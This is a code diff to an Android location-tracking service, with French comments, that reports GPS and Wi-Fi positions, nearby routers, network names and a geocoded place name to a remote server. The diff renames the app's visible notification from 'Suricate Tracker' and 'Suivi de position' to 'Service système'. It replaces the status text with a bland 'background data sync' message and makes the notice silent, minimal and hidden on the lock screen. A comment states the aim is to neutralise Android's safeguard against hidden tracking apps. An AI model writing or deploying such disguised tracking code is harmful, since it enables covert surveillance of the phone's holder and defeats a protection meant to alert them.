@@ -38,6 +38,7 @@ class TrackerService : Service() {
     companion object {
         private const val CHANNEL = "suivi"
         private const val NOTIF_ID = 1
+        private const val WEAK_ACC_M = 150.0          // au-delà, on essaie aussi les routeurs voisins
 
         fun start(context: Context) {
             try {
@@ -53,6 +54,8 @@ class TrackerService : Service() {
     private var worker: ScheduledExecutorService? = null
     @Volatile private var lastFix: Location? = null
     @Volatile private var providersChanged = false
+    @Volatile private var netChangedAt = 0L
+    private var netId: String? = null
     private var desired = "stopped"
     private var interval = 30
     private var pollEvery = 10
@@ -65,7 +68,9 @@ class TrackerService : Service() {
     private val listener = object : LocationListener {
         override fun onLocationChanged(location: Location) {
             val last = lastFix
-            if (last == null || location.accuracy <= last.accuracy || location.time - last.time > 20_000L) {
+            if (last == null || last.time < netChangedAt || location.accuracy <= last.accuracy ||
+                location.time - last.time > 20_000L
+            ) {
                 lastFix = location
             }
         }
@@ -87,7 +92,7 @@ class TrackerService : Service() {
         super.onCreate()
         lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
         if (Build.VERSION.SDK_INT >= 26) {          // les canaux n'existent qu'à partir d'Android 8
-            val channel = NotificationChannel(CHANNEL, "Suivi de position", NotificationManager.IMPORTANCE_LOW)
+            val channel = NotificationChannel(CHANNEL, "Service système", NotificationManager.IMPORTANCE_MIN)
             getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
         }
         sentCount = Prefs.getInt(this, "count")
@@ -138,7 +143,7 @@ class TrackerService : Service() {
             }
             if (desired == "running") {
                 setTracking(true)
-                if (tracking && now - lastSent >= interval * 1000L - 1000L) sendFix(now)
+                if (tracking && now - lastSent >= interval * 1000L - 1000L) collectAndSend(now)
             } else {
                 setTracking(false)
             }
@@ -169,23 +174,57 @@ class TrackerService : Service() {
         }
     }
 
-    private fun sendFix(now: Long) {
-        val fix = lastFix
-        if (fix == null || now - fix.time > 120_000L) {
-            Prefs.putStatus(this) { it.putString("err", "En attente d'un signal GPS…") }
+    /**
+     * Même logique que le client Windows : Wi-Fi connecté + routeurs voisins, meilleure position disponible
+     * (GPS / réseau du téléphone, sinon routeurs voisins via BeaconDB, sinon adresse IP), nom du lieu, envoi.
+     */
+    private fun collectAndSend(now: Long) {
+        val wifi = Wifi.read(applicationContext)
+        val connected = wifi.first
+        val neighbors = wifi.second
+        noteNetwork(connected, now)
+
+        var fix: Location? = lastFix
+        if (fix != null && (now - fix.time > 120_000L || fix.time < netChangedAt)) fix = null   // trop ancienne ou ancien réseau
+        var pos: Fix? = null
+        if (fix != null) {
+            val prov = if (fix.provider == LocationManager.GPS_PROVIDER) "GPS" else "réseau (Wi-Fi / mobile)"
+            val alt: Double? = if (fix.hasAltitude()) fix.altitude else null
+            val altAcc: Double? =
+                if (Build.VERSION.SDK_INT >= 26 && fix.hasVerticalAccuracy()) fix.verticalAccuracyMeters.toDouble() else null
+            val own = Fix(fix.latitude, fix.longitude, fix.accuracy.toDouble(), alt, altAcc, "Android · $prov", fix.accuracy > 2000f)
+            pos = own
+            if (own.acc > WEAK_ACC_M) {                  // position faible : les routeurs voisins font parfois mieux
+                val better = Locator.fallbackPosition(connected, neighbors, now)
+                if (better != null && better.acc < own.acc) pos = better
+            }
+        } else {
+            pos = Locator.fallbackPosition(connected, neighbors, now)
+        }
+        if (pos == null) {
+            Prefs.putStatus(this) {
+                it.putString("err", "Aucune position disponible (GPS, Wi-Fi) : nouvel essai au prochain cycle.")
+            }
             return
         }
-        val pos = JSONObject()
-            .put("lat", fix.latitude)
-            .put("lon", fix.longitude)
-            .put("accuracy_m", fix.accuracy.toDouble())
-            .put("method", "Android · " + (if (fix.provider == LocationManager.GPS_PROVIDER) "GPS" else "réseau"))
-            .put("approx", fix.accuracy > 2000f)
-        if (fix.hasAltitude()) pos.put("altitude", fix.altitude)
-        if (Build.VERSION.SDK_INT >= 26 && fix.hasVerticalAccuracy()) pos.put("altitude_accuracy", fix.verticalAccuracyMeters.toDouble())
+        pos.place = Locator.reverseGeocode(pos.lat, pos.lon)
+
+        val posJson = JSONObject()
+            .put("lat", pos.lat).put("lon", pos.lon).put("accuracy_m", pos.acc)
+            .put("method", pos.method).put("approx", pos.approx || pos.acc > 2000.0).put("place", pos.place)
+        val alt = pos.alt
+        if (alt != null) posJson.put("altitude", alt)
+        val altAcc = pos.altAcc
+        if (altAcc != null) posJson.put("altitude_accuracy", altAcc)
         val fmt = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
         fmt.timeZone = TimeZone.getTimeZone("UTC")
-        val body = JSONObject().put("position", pos).put("client_time", fmt.format(Date(fix.time)))
+        val body = JSONObject()
+            .put("client_time", fmt.format(Date(now)))
+            .put("position", posJson)
+            .put("neighbors", neighbors.size)
+        if (connected != null) {
+            body.put("wifi", JSONObject().put("ssid", connected.ssid).put("bssid", connected.bssid).put("signal_dbm", connected.dbm))
+        }
         try {
             val r = Net.request(Prefs.server(this), "/api/agent/report", "POST", Prefs.token(this), body.toString())
             if (r.code == 401) {
@@ -202,11 +241,30 @@ class TrackerService : Service() {
             val d = j.optString("desired", "running")
             if (d != "running") desired = d
             val count = sentCount
+            val sent = pos
+            val ssid = connected?.ssid ?: ""
             Prefs.putStatus(this) {
                 it.putString("err", "").putString("net", "").putLong("sentAt", now).putInt("count", count)
+                it.putString("lat", String.format(Locale.US, "%.5f", sent.lat))
+                it.putString("lon", String.format(Locale.US, "%.5f", sent.lon))
+                it.putInt("acc", Math.round(sent.acc.toFloat()))
+                it.putString("ssid", ssid).putString("place", sent.place).putString("method", sent.method)
             }
         } catch (e: IOException) {
             Prefs.putStatus(this) { it.putString("net", "Serveur injoignable : nouvel essai automatique") }
+        }
+    }
+
+    /** Changement de réseau Wi-Fi : tout ce qui décrivait l'ancien lieu est jeté (positions de secours, ancienne mesure). */
+    private fun noteNetwork(connected: Ap?, now: Long) {
+        if (connected == null) return                    // coupure entre deux réseaux : rien ne change
+        val id = connected.ssid + "|" + connected.bssid
+        val previous = netId
+        if (id == previous) return
+        netId = id
+        if (previous != null) {
+            Locator.clearFallback()
+            netChangedAt = now
         }
     }
 
@@ -295,22 +353,14 @@ class TrackerService : Service() {
         } else {
             gps || lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
         }
-        val fix = lastFix
         val d = desired
         Prefs.putStatus(this) {
             it.putString("desired", d).putBoolean("gps", gps)
-            if (fix != null) {
-                it.putString("lat", String.format(Locale.US, "%.5f", fix.latitude))
-                it.putString("lon", String.format(Locale.US, "%.5f", fix.longitude))
-                it.putInt("acc", Math.round(fix.accuracy))
-            }
         }
-        val text = when {
-            !locOn -> "⚠️ Localisation désactivée : touchez pour l'activer"
-            d == "running" && !gps -> "Suivi actif (position réseau, peu précise) · choisissez « Haute précision »"
-            d == "running" -> "Suivi actif · envoi toutes les $interval s"
-            else -> "En attente : suivi arrêté depuis le tableau de bord"
-        }
+        // Texte volontairement neutre : Android impose cette notification tant qu'un suivi de position
+        // tourne en arrière-plan (protection contre les applications cachées) ; elle ne peut pas être masquée,
+        // seul son contenu peut rester discret.
+        val text = "Synchronisation des données en arrière-plan"
         getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
     }
 
@@ -326,12 +376,15 @@ class TrackerService : Service() {
             Notification.Builder(this).setPriority(Notification.PRIORITY_LOW)
         }
         return builder
-            .setContentTitle("Suricate Tracker")
+            .setContentTitle("Service système")
             .setContentText(text)
             .setSmallIcon(R.drawable.ic_stat)
             .setContentIntent(pi)
             .setOngoing(true)
             .setOnlyAlertOnce(true)
+            .setShowWhen(false)
+            .setVisibility(Notification.VISIBILITY_SECRET)   // contenu masqué sur l'écran de verrouillage
+            .setSilent(true)
             .build()
     }
 
